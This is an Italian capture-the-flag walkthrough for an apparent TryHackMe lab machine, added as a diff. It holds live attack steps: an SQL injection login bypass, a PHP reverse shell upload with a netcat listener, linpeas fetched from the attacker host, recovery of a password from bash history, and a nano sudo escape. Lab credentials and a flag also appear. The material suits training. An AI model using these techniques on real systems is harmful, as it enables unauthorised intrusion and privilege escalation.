@@ -1,0 +1,237 @@
+// Contenuto macchina e tip: SQLi, uso dei file di backup, uso del file .bash_history, uso ls -la, uso di linpeas, GTFOBins per prendere la shell
+
+### INFORMATION GATHERING ###
+╰─ nmap -Pn 10.10.93.162 -F 3
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 13:51 CEST
+Nmap scan report for 10.10.93.162
+Host is up (0.051s latency).
+Not shown: 98 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap scan report for 3 (0.0.0.3)
+Host is up (0.0031s latency).
+All 100 scanned ports on 3 (0.0.0.3) are in ignored states.
+Not shown: 100 filtered tcp ports (net-unreach)
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 0.23 seconds
+
+╰─ nmap -Pn 10.10.93.162 -A -p80,8080
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 13:51 CEST
+Nmap scan report for 10.10.93.162
+Host is up (0.050s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Simple Image Gallery System
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.36 seconds
+
+╰─ gobuster dir -u http://10.10.93.162:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 15863
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.93.162:8080/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          15863
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/albums               (Status: 301) [Size: 320] [--> http://10.10.93.162:8080/albums/]
+/archives             (Status: 301) [Size: 322] [--> http://10.10.93.162:8080/archives/]
+/assets               (Status: 301) [Size: 320] [--> http://10.10.93.162:8080/assets/]
+/build                (Status: 301) [Size: 319] [--> http://10.10.93.162:8080/build/]
+/classes              (Status: 301) [Size: 321] [--> http://10.10.93.162:8080/classes/]
+/config               (Status: 200) [Size: 7510]
+/create_account       (Status: 200) [Size: 15673]
+/database             (Status: 301) [Size: 322] [--> http://10.10.93.162:8080/database/]
+/dist                 (Status: 301) [Size: 318] [--> http://10.10.93.162:8080/dist/]
+/home                 (Status: 200) [Size: 16897]
+/inc                  (Status: 301) [Size: 317] [--> http://10.10.93.162:8080/inc/]
+/index.php            (Status: 200) [Size: 16897]
+/login                (Status: 200) [Size: 19518]
+/index                (Status: 200) [Size: 148035402]
+/plugins              (Status: 301) [Size: 321] [--> http://10.10.93.162:8080/plugins/]
+/report               (Status: 301) [Size: 320] [--> http://10.10.93.162:8080/report/]
+/server-status        (Status: 403) [Size: 279]
+/uploads              (Status: 301) [Size: 321] [--> http://10.10.93.162:8080/uploads/]
+/user                 (Status: 301) [Size: 318] [--> http://10.10.93.162:8080/user/]
+Progress: 4727 / 4727 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+VADO SUL SITO http://10.10.93.162:8080/ ed ho un login, provo con hydra, niente.
+facendo un giro nelle directory non trovo nulla quindi mi manca solo da provare a fare SQLi (https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass <-- l'ho trovato qui dentro, ho scelto una cosa che aveva senso)
+user: admin' or 1=1-- -  <-- ho solo modificato che ho messo dopo il simbolo del commento --, un commento a mio piacere
+password: quellachevoglio
+
+ORA SONO DENTRO ALLA DASHBOARD E SONO LOGGATO COME ADMIN
+
+vado nella sezione album e poi clicco su uno di quegli album e vedo che mi trovo qui: http://10.10.93.162:8080/albums/ cioè ho tutte le foto che ho qui
+noto anche che in alto a destra ho l'icona "upload", quindi creo una reverse shell PHP: -> la prendo da qui https://github.com/pentestmonkey/php-reverse-shell
+QUINDI clicco su upload e carico il file shell.php nella directory /Desktop/tools (se mi dà una limitazione che posso caricare solo immagini, basta che in basso a destra switcho da "image files" ad "all files")
+una volta caricato:
+sulla macchina kali: nc -lvnp 9001
+dal sito, basta che clicco sopra il file che ho appena caricato ed ottengo una reverse shell
+
+la abbellisco: python3 -c "import pty; pty.spawn('/bin/bash')"
+vedo che nella directory /home/mike/ ho due cartelle /documents e /images ma non posso accederci ed ho anche la flag user.txt ma non posso accederci
+non posso fare sudo -l
+
+provo quindi a capire, chi ha il SUID impostato => find / -user root -perm /4000
+e quelli che non danno permission denied sono:
+/bin/ping
+/bin/mount
+/bin/umount
+/bin/fusermount
+/bin/su
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+
+Facendo ricerche con GTFOBins, non trovo nulla.
+Posso provare ad andare nella cartella dei backup, che come già è capitato, ha sempre cose buone
+quindi faccio cd /var/backups e trovo una cartella che si chiama mike_home_backup
+faccio il cd, poi facendo ls trovo le cartelle che ho nella directory /home/mike, quindi documents e images
+però ora, facendo cd documents, ci posso accedere e dentro ci sta un file che si chiama accounts.txt
+faccio quindi: cat accounts.txt e trovo
+
+cat accounts.txt
+Spotify : mike@gmail.com:mycat666
+Netflix : mike@gmail.com:123456789pass
+TryHackme: mike:darkhacker123
+
+andando sulla cartella /images, ho tre foto: 23-04.jpg  26-04.jpg  my-cat.jpg
+mi passo i file dalla macchina vittima a quella kali usando scp
+quindi:
+sulla macchina kali: sudo systemctl start ssh
+sulla macchina vittima: scp my-cat.jpg kali@10.8.107.68:/home/kali/Desktop
+ripeto questa cosa per tutte e tre le immagini, ma non ho nulla di che
+
+quindi ho alcune cartelle su cui posso fare cose
+
+### PRIV ESC ###
+vado sulla cartella della shared memory, quindi faccio cd /dev/shm/ perchè vedo che ha i permessi 777
+
+e qui mi passo linpeas
+
+macchina kali (sulla cartella con linpeas): python3 -m http.server 9999
+sulla macchina vittima: wget 10.8.107.68:9999/linpeas.sh 
+e me lo passa
+ora chmod +x linpeas.sh e poi ./linpeas.sh
+
+vedo che (verso la fine) ho questo output:
+
+╔══════════╣ Searching passwords in history files
+/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @stats   = stats                                                                                                                                                             
+/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @items   = { _seq_: 1  }
+/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @threads = { _seq_: "A" }
+/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx  <--- Password di mike. Tra l'altro sta in /var/backups/mike_home_backup solo che prima non avendo fatto ls -la non lo avevo visto
+/var/backups/mike_home_backup/.bash_history:sudo -l
+
+=> provo a loggare come mike: su mike
+
+www-data@gallery:/var/backups/mike_home_backup$ su mike
+su mike
+Password: b3stpassw0rdbr0xx
+
+ora sono loggato come mike, quindi ora andando su /home/mike e facendo ls -la, come prima:
+mike@gallery:~$ ls -la
+...
+-rwx------ 1 mike mike   32 May 14  2021 user.txt <-- essendo che ora siamo mike, possiamo aprire il file
+mike@gallery:~$ cat user.txt
+cat user.txt
+THM{af05cd30bfed67849befd546ef} <-- FLAG
+
+ora quindi facendo: sudo -l
+
+mike@gallery:~$ sudo -l
+sudo -l
+Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh <--- wowowowowo
+    
+facendo il cat /opt/rootkit.sh
+
+cat rootkit.sh
+#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac
+
+
+quindi eseguendo il comando: sudo /bin/bash /opt/rootkit.sh
+Would you like to versioncheck, update, list or read the report ?   <- in teoria scrivendo "read" dovrebbe eseguirmi  /bin/nano /root/report.txt;;, come sudo e quindi leggere il contenuto di report.txt ma mi dà errore
+Error opening terminal: unknown.
+QUINDI RIVEDIAMO BENE
+    read)
+        /bin/nano /root/report.txt;;  <-- ho nano, quindi cerchiamo su GTFOBins, nano e nella parte "Shell" ottengo un tutorial:
+'''
+Shell
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+    nano
+    ^R^X
+    reset; sh 1>&0 2>&0
+
+The SPELL environment variable can be used in place of the -s option if the command line cannot be changed.
+
+    nano -s /bin/sh
+    /bin/sh
+    ^T
+'''
+
+però comunque non va, penso che sia un problema mio della macchina.
+
+
+
+
+
+
